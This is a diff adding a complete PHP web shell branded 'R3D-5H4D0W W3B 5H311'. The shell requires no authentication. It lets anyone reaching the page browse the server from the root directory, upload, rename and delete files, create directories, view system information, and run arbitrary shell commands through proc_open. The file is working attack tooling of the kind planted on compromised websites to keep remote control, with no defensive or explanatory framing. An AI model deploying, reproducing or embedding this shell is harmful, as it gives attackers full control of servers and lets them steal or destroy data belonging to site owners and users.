@@ -1,0 +1,276 @@
+<?php
+
+
+$dir = isset($_GET['dir']) ? $_GET['dir'] : '/'; // Start from root directory
+
+if (!is_dir($dir)) {
+    die('Invalid directory.');
+}
+
+// Handle file uploads
+if (isset($_FILES['upload'])) {
+    $uploadFile = $dir . '/' . basename($_FILES['upload']['name']);
+    if (move_uploaded_file($_FILES['upload']['tmp_name'], $uploadFile)) {
+        echo "<p class='message success'>File uploaded successfully.</p>";
+    } else {
+        echo "<p class='message error'>Failed to upload file.</p>";
+    }
+}
+
+// Handle file renaming
+if (isset($_POST['old_name']) && isset($_POST['new_name'])) {
+    $oldName = $dir . '/' . $_POST['old_name'];
+    $newName = $dir . '/' . $_POST['new_name'];
+    if (rename($oldName, $newName)) {
+        echo "<p class='message success'>File renamed successfully.</p>";
+    } else {
+        echo "<p class='message error'>Failed to rename file.</p>";
+    }
+}
+
+// Handle file deletion
+if (isset($_GET['delete'])) {
+    $fileToDelete = $dir . '/' . $_GET['delete'];
+    if (is_file($fileToDelete) && unlink($fileToDelete)) {
+        echo "<p class='message success'>File deleted successfully.</p>";
+    } else {
+        echo "<p class='message error'>Failed to delete file.</p>";
+    }
+}
+
+// Handle directory creation
+if (isset($_POST['new_dir'])) {
+    $newDir = $dir . '/' . $_POST['new_dir'];
+    if (mkdir($newDir)) {
+        echo "<p class='message success'>Directory created successfully.</p>";
+    } else {
+        echo "<p class='message error'>Failed to create directory.</p>";
+    }
+}
+
+// Handle command execution
+function execute_command($command) {
+    $descriptorspec = [
+        0 => ["pipe", "r"],  // stdin
+        1 => ["pipe", "w"],  // stdout
+        2 => ["pipe", "w"],  // stderr
+    ];
+
+    $process = proc_open($command, $descriptorspec, $pipes);
+
+    if (is_resource($process)) {
+        $output = stream_get_contents($pipes[1]);
+        fclose($pipes[1]);
+
+        $errorOutput = stream_get_contents($pipes[2]);
+        fclose($pipes[2]);
+
+        proc_close($process);
+
+        return [
+            'output' => $output,
+            'error' => $errorOutput
+        ];
+    }
+
+    return ['output' => '', 'error' => 'Failed to execute command.'];
+}
+
+$commandResult = '';
+if (isset($_POST['command'])) {
+    $command = escapeshellcmd($_POST['command']);
+    $result = execute_command($command);
+
+    $commandResult = "<div class='command-output'><pre>" . htmlspecialchars($result['output']) . "</pre></div>";
+    if (!empty($result['error'])) {
+        $commandResult .= "<div class='command-error'><strong>Error Output:</strong><pre>" . htmlspecialchars($result['error']) . "</pre></div>";
+    }
+}
+
+$files = scandir($dir);
+
+// Gather system information
+$systemInfo = [
+    'PHP Version' => phpversion(),
+    'Server Software' => $_SERVER['SERVER_SOFTWARE'],
+    'OS' => php_uname(),
+    'Document Root' => $_SERVER['DOCUMENT_ROOT'],
+    'Current Directory' => realpath($dir),
+];
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>R3D-5H4D0W</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            font-family: 'Courier New', Courier, monospace;
+            background-image: url('https://mrwallpaper.com/images/hd/akatsuki-members-silhouette-hkucs24meofmak7p.jpg');
+            background-size: cover; /* This makes the image cover the entire background */
+            background-position: center; /* This centers the background image */
+             background-repeat: no-repeat; /* Prevents the image from repeating */
+        }
+
+
+        .header {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .header img {
+            width: 150px;
+        }
+        .header h1 {
+            margin: 10px 0 0;
+            color: #c0392b;
+        }
+        .system-info, .command-output, .command-error {
+            background-color: #1e1e1e;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px auto;
+            width: 90%;
+            color: #ffffff;
+        }
+        .system-info ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        .system-info li {
+            margin: 5px 0;
+        }
+        form {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        input, button {
+            background-color: #333;
+            color: #fff;
+            border: none;
+            padding: 8px 15px;
+            margin: 5px;
+            border-radius: 5px;
+            font-family: 'Courier New', Courier, monospace;
+        }
+        input[type="text"], input[type="file"] {
+            width: 300px;
+        }
+        button:hover {
+            background-color: #c0392b;
+            cursor: pointer;
+        }
+        table {
+            width: 90%;
+            margin: 20px auto;
+            border-collapse: collapse;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border: 1px solid #333;
+        }
+        th {
+            background-color: #c0392b;
+        }
+        tr:nth-child(even) {
+            background-color: #1e1e1e;
+        }
+        a {
+            color: #3498db;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .message {
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .success {
+            color: #2ecc71;
+        }
+        .error {
+            color: #e74c3c;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQosAcETJvSjaOL2Ot1Xayzj8OddO6WZZB3SA&s" alt="Akatsuki Logo">
+        <h1>R3D-5H4D0W W3B 5H311</h1>
+    </div>
+    <div class="system-info">
+        <h3>System Information</h3>
+        <ul>
+            <?php foreach ($systemInfo as $infoName => $infoValue): ?>
+                <li><strong><?php echo htmlspecialchars($infoName); ?>:</strong> <?php echo htmlspecialchars($infoValue); ?></li>
+            <?php endforeach; ?>
+        </ul>
+    </div>
+
+    <h2 style="text-align: center;">Current Directory: <?php echo htmlspecialchars($dir); ?></h2>
+
+    <form enctype="multipart/form-data" method="POST">
+        <input type="file" name="upload">
+        <button type="submit">Upload File</button>
+    </form>
+
+    <form method="POST">
+        <input type="text" name="new_dir" placeholder="New Directory Name">
+        <button type="submit">Create Directory</button>
+    </form>
+
+    <h3 style="text-align: center;">Files and Directories:</h3>
+    <table>
+        <thead>
+            <tr>
+                <th>Name</th>
+                <th>Type</th>
+                <th>Actions</th>
+            </tr>
+        </thead>
+        <tbody>
+            <?php foreach ($files as $file): ?>
+                <?php if ($file === '.' || $file === '..') continue; ?>
+                <tr>
+                    <td>
+                        <?php if (is_dir($dir . '/' . $file)): ?>
+                            <a href="?dir=<?php echo urlencode($dir . '/' . $file); ?>"><?php echo htmlspecialchars($file); ?></a>
+                        <?php else: ?>
+                            <?php echo htmlspecialchars($file); ?>
+                        <?php endif; ?>
+                    </td>
+                    <td><?php echo is_dir($dir . '/' . $file) ? 'Directory' : 'File'; ?></td>
+                    <td>
+                        <?php if (!is_dir($dir . '/' . $file)): ?>
+                            <a href="?dir=<?php echo urlencode($dir); ?>&delete=<?php echo urlencode($file); ?>">Delete</a>
+                            <form method="POST" style="display:inline;">
+                                <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($file); ?>">
+                                <input type="text" name="new_name" placeholder="New Name">
+                                <button type="submit">Rename</button>
+                            </form>
+                        <?php endif; ?>
+                    </td>
+                </tr>
+            <?php endforeach; ?>
+        </tbody>
+    </table>
+
+    <a href="?dir=<?php echo urlencode(dirname($dir)); ?>" style="display: block; text-align: center; margin-bottom: 20px;">Go Up</a>
+
+    <h3 style="text-align: center;">Execute Command:</h3>
+    <form method="POST" style="text-align: center;">
+        <input type="text" name="command" placeholder="Enter command" style="width: 300px;">
+        <button type="submit">Run Command</button>
+    </form>
+
+    <?php if ($commandResult): ?>
+        <h4 style="text-align: center;">Command Result:</h4>
+        <?php echo $commandResult; ?>
+    <?php endif; ?>
+</body>
+</html>
